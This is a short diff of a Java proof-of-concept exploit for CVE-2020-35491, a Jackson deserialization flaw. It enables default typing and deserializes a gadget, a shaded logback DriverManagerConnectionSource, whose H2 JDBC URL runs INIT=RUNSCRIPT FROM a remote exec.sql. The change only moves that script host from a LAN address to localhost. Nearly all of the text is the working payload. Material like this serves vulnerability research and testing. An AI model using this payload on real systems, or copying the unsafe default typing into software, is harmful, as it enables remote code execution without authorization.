@@ -15,7 +15,7 @@ public class CVE_2020_35491
         ObjectMapper mapper = new ObjectMapper();
         mapper.enableDefaultTyping();
         mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false);
-        String json = "[\"com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://192.168.16.132:1234/exec.sql'\"}]";
+        String json = "[\"com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:1234/exec.sql'\"}]";
         Object obj = mapper.readValue(json, Object.class);
         mapper.writeValueAsString(obj);
     }
